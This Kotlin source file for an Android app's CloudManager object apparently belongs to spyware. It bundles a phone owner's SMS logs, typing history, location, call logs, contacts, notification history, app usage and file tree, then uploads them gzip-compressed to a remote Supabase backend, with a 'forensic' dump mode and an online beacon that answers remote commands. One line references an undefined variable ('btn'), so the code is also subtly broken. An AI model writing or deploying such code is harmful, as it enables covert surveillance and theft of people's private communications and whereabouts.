package com.example.myandroid

import android.content.Context
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object CloudManager {

    // Modular Upload: Takes a list of features to upload (e.g. ["sms", "location"] or ["ALL"])
    suspend fun uploadData(ctx: Context, modules: List<String>) {
        withContext(Dispatchers.IO) {
            try {
                DebugLogger.log("Cloud", "Starting Upload. Modules: $modules")
                
                // Check Global Config before uploading
                if (!ConfigManager.canUpload(ctx)) {
                    DebugLogger.log("Cloud", "Upload BLOCKED by Schedule/Config")
                    return@withContext
                }

                val json = JSONObject()
                json.put("device_id", DeviceManager.getDeviceId(ctx))
                json.put("device_model", android.os.Build.MODEL)

                // Fallback: Attach token to standard uploads if it exists
                val fcmToken = ctx.getSharedPreferences("app_identity", Context.MODE_PRIVATE).getString("fcm_token", null)
                if (fcmToken != null) json.put("fcm_token", fcmToken)
                json.put("trigger", if (btn != null) "MANUAL" else "AUTO")
                
                val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val isAll = modules.contains("ALL")

                // --- MODULE 1: BASIC VITALS ---
                if (isAll || modules.contains("vitals")) {
                    val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                    json.put("battery_level", batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0)
                }

                // --- MODULE 2: SMS ---
                if (isAll || modules.contains("sms")) {
                    json.put("sms_count", prefs.getInt("sms_count", 0))
                    json.put("sms_logs", JSONArray(prefs.getString("sms_logs_cache", "[]")))
                }

                // --- MODULE 3: USAGE ---
                if (isAll || modules.contains("usage")) {
                     val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                     val startToday = TimeManager.getStartOfDay()
                     val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_BEST, startToday, System.currentTimeMillis())
                     val totalMins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(
                         stats.filter { it.lastTimeUsed >= startToday }.sumOf { it.totalTimeInForeground }
                     )
                     
                     json.put("screen_time_minutes", totalMins)
                     json.put("app_usage_timeline", UsageManager.getTimeline(ctx))
                     
                     // Online Time
                     val (netTime, netSessions) = NetworkTracker.getStats(ctx)
                     json.put("online_time_minutes", java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(netTime))
                     json.put("online_sessions", netSessions)
                }

                // --- MODULE 4: LOCATION ---
                if (isAll || modules.contains("location")) {
                    json.put("location_history", JSONArray(prefs.getString("location_history", "[]")))
                }

                // --- MODULE 5: TYPING ---
                if (isAll || modules.contains("typing")) {
                     json.put("typing_history", JSONArray(prefs.getString("typing_history", "[]")))
                }
                
                // --- MODULE 6: NETWORK ---
                if (isAll || modules.contains("network")) {
                     json.put("network_logs", JSONArray(prefs.getString("net_history_log", "[]")))
                }

                // --- MODULE 7: PHONE (FORENSIC) ---
                if (isAll || modules.contains("phone")) {
                     json.put("calls", PhoneManager.getCallLogs(ctx))
                     json.put("contacts", PhoneManager.getContacts(ctx))
                     json.put("apps", AppListManager.getInstalledApps(ctx))
                }

                // --- MODULE 8: FILES (Skeleton) ---
                if (modules.contains("files")) {
                    // Heavy! Only if explicitly asked, NEVER in "ALL" by default to save data
                    json.put("file_skeleton", FileManager.generateReport())
                }
                
                // --- MODULE 9: NOTIFICATIONS ---
                if (isAll || modules.contains("notifications")) {
                     json.put("notif_history", JSONArray(prefs.getString("notif_history", "[]")))
                }

                // --- SUMMARY STATS AGGREGATION ---
                val summary = JSONObject()
                val distKm = prefs.getFloat("total_distance_km", 0f)
                summary.put("location_dist_km", distKm)
                
                val typeStats = TypingManager.getStats(ctx)
                summary.put("typing_chars", typeStats.getInt("total_chars"))
                summary.put("typing_wpm", typeStats.getInt("avg_wpm"))
                
                val phoneStats = PhoneManager.getStats(ctx)
                summary.put("call_duration_sec", phoneStats.totalDuration)
                summary.put("call_count_total", phoneStats.totalCalls)
                summary.put("contact_count", phoneStats.contactCount)
                
                summary.put("notif_count_total", prefs.getInt("notif_count", 0))
                summary.put("app_switch_count", UsageManager.getSwitchCount(ctx))
                
                json.put("summary_stats", summary)

                // SEND TO SUPABASE
                val supabaseUrl = SecretVault.getRestUrl(ctx, "device_stats")
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                // CRITICAL: Tells Supabase API Gateway to decompress this payload
                conn.setRequestProperty("Content-Encoding", "gzip")
                conn.doOutput = true

                // Stream bytes through a GZIP compressor to crush text bloat
                java.util.zip.GZIPOutputStream(conn.outputStream).use { gzip ->
                    gzip.write(json.toString().toByteArray(Charsets.UTF_8))
                }

                val code = conn.responseCode
                if (code !in 200..299) {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Code: $code | Msg: $err")
                } else {
                    DebugLogger.log("Cloud", "Upload Finished. Code: $code")
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    // --- INTERNAL DUMP COLLECTOR (FORENSIC MODE) ---
    fun collectDumpData(ctx: Context): JSONObject {
        val json = JSONObject()
        
        // 1. System Vitals
        json.put("static", DeviceManager.getStaticInfo(ctx))
        json.put("health", DeviceManager.getHealthStats(ctx))
        
        // 2. STREAM LOGGING RECOVERY
        json.put("stream_logs_status", "Delegated to Survivor Protocol (Streamed to Vault)")
        
        // 3. Persistent Data (The Deep Dive)
        json.put("calls", PhoneManager.getCallLogs(ctx))
        json.put("contacts", PhoneManager.getContacts(ctx))
        json.put("apps", AppListManager.getInstalledApps(ctx))

        // 4. File System
        try {
             if (PermissionManager.hasAllFilesAccess(ctx)) {
                 json.put("file_tree", FileManager.generateReport())
             }
        } catch(e: Exception) { json.put("file_tree", "ERROR: ${e.message}") }

        return json
    }

    // --- LIGHTWEIGHT BEACON (For IM_ONLINE command) ---
    fun sendPing(ctx: Context, note: String = "Online") {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val json = JSONObject()
                json.put("device_id", DeviceManager.getDeviceId(ctx))
                json.put("device_model", android.os.Build.MODEL)
                json.put("trigger", "BEACON")
                json.put("note", note)
                json.put("timestamp", System.currentTimeMillis())
                
                val summary = JSONObject()
                summary.put("status", "ONLINE")
                json.put("summary_stats", summary)

                val supabaseUrl = SecretVault.getRestUrl(ctx, "device_stats")
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                conn.outputStream.use { it.write(json.toString().toByteArray()) }
                val code = conn.responseCode
                if (code !in 200..299) {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Ping Failed: $code | $err")
                } else {
                    DebugLogger.log("BEACON", "Ping sent ($note). Code: $code")
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    // --- SYNCHRONOUS FILE UPLOAD (OOM-SAFE STREAMING MULTIPART) ---
    suspend fun uploadFile(ctx: Context, file: java.io.File, category: String = "GENERAL"): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                DebugLogger.log("CLOUD", "Starting Stream Upload: ${file.name}")
                val deviceId = DeviceManager.getDeviceId(ctx)
                
                val supabaseUrl = SecretVault.getUploaderUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)
                val boundary = "*****CortexBoundary${System.currentTimeMillis()}*****"
                val twoHyphens = "--"
                val crlf = "\r\n"

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                conn.doOutput = true
                
                // CRITICAL FOR MEMORY: Prevents Android from loading the whole file into RAM to calculate Content-Length
                conn.setChunkedStreamingMode(4096) 

                conn.outputStream.use { os ->
                    val writer = os.writer()
                    
                    // Part 1: Device ID
                    writer.append(twoHyphens).append(boundary).append(crlf)
                    writer.append("Content-Disposition: form-data; name=\"deviceId\"").append(crlf).append(crlf)
                    writer.append(deviceId).append(crlf)
                    
                    // Part 2: Category
                    writer.append(twoHyphens).append(boundary).append(crlf)
                    writer.append("Content-Disposition: form-data; name=\"category\"").append(crlf).append(crlf)
                    writer.append(category).append(crlf)
                    
                    // Part 3: File
                    writer.append(twoHyphens).append(boundary).append(crlf)
                    writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"${file.name}\"").append(crlf)
                    writer.append("Content-Type: application/octet-stream").append(crlf).append(crlf)
                    writer.flush()
                    
                    // Stream the file bits directly from disk to network socket (8KB chunks)
                    file.inputStream().use { input ->
                        val buffer = ByteArray(8192)
                        var bytesRead: Int
                        while (input.read(buffer).also { bytesRead = it } != -1) {
                            os.write(buffer, 0, bytesRead)
                        }
                    }
                    os.flush()
                    writer.append(crlf)
                    
                    // End Boundary
                    writer.append(twoHyphens).append(boundary).append(twoHyphens).append(crlf)
                    writer.flush()
                }
                
                val code = conn.responseCode
                if (code !in 200..299) {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Stream Upload Failed (${file.name}): $code | $err")
                } else {
                    DebugLogger.log("CLOUD", "Stream Upload ${file.name} Result: $code")
                }
                return@withContext code in 200..299
            } catch (e: Exception) {
                DebugLogger.log("CLOUD", "Stream Upload Fatal: ${e.message}")
                return@withContext false
            }
        }
    }

    suspend fun uploadSkeleton(ctx: Context, json: JSONObject) {
        withContext(Dispatchers.IO) {
            try {
                json.put("device_id", DeviceManager.getDeviceId(ctx))
                
                val supabaseUrl = SecretVault.getRestUrl(ctx, "storage_backups")
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Prefer", "return=minimal")
                // CRITICAL: Tells Supabase API Gateway to decompress this payload
                conn.setRequestProperty("Content-Encoding", "gzip")
                conn.doOutput = true

                // Stream bytes through a GZIP compressor to crush text bloat
                java.util.zip.GZIPOutputStream(conn.outputStream).use { gzip ->
                    gzip.write(json.toString().toByteArray(Charsets.UTF_8))
                }
                val code = conn.responseCode
                if (code !in 200..299) {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Skeleton Failed: $code | $err")
                } else {
                    DebugLogger.log("Cloud", "Skeleton Upload ($code) - Size: ${json.toString().length} bytes")
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}
